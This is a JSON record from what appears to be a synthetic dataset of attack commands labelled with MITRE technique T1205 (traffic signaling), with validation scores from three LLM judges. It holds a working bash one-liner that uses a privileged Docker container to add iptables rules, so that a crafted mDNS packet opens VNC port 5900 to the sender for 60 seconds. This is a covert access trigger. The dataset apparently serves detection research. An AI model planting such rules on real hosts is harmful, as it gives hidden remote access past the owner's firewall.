{
  "technique_id": "T1205",
  "platform": "Linux",
  "shell": "bash",
  "command": "docker run --rm --net=host --cap-add=NET_ADMIN alpine sh -c \"apk add --no-cache iptables >/dev/null && iptables -I INPUT -p udp --dport 5353 -m string --string '_knock._udp' --algo bm -j LOG --log-prefix 'T1205_MDNS_SIG ' --log-level 4 && iptables -I INPUT -p udp --dport 5353 -m string --string '_knock._udp' --algo bm -m recent --name t1205_mdns --set && iptables -I INPUT -p tcp --dport 5900 -m recent --name t1205_mdns --rcheck --seconds 60 --reap -j ACCEPT\"",
  "explanation": "Uses mDNS payload containing a service label '_knock._udp' on UDP/5353 as the signal. Logs the anomalous query and grants temporary access to TCP/5900 (VNC) for the signaling IP.",
  "rationale_steps": [
    "Run iptables alterations via Docker in the host net namespace.",
    "Identify an unusual mDNS service string as a traffic signal.",
    "Open TCP/5900 for 60 seconds to the IP that signaled."
  ],
  "obfuscation_level": "none",
  "id": "SYN-BASH-T1205-4970f6eb-27d4d7d8",
  "source_prompt_hash": "4970f6eb",
  "timestamp_utc": "2025-09-30T03:38:51.523409Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "Balanced quoting and chaining with valid docker, apk, and iptables flags make the command well-formed and parseable.",
        "semantic_score": 4,
        "semantic_justification": "It implements mDNS-based traffic signaling with logging and a recent-list gate to temporarily allow TCP/5900, though it relies on docker/NET_ADMIN privileges and host iptables/nft compatibility.",
        "combined_score": 4.5,
        "confidence": 0.9,
        "timestamp": "2025-10-01T18:28:25.181549Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, correct command separators, and valid iptables flags and syntax.",
        "semantic_score": 5,
        "semantic_justification": "The command accurately implements the described port-knocking-like signaling using an mDNS-port-specific string to trigger temporary network access, perfectly aligning with T1205 Traffic Signaling.",
        "combined_score": 5.0,
        "confidence": 1,
        "timestamp": "2025-10-01T18:28:43.503086Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with proper Docker syntax, balanced quotes, valid iptables flags, and correct command chaining.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by creating a covert knock sequence where a specific mDNS packet containing '_knock._udp' triggers temporary access to VNC (port 5900) for 60 seconds.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T03:28:44.487425Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 4.667,
    "llm_average_score": 4.833,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}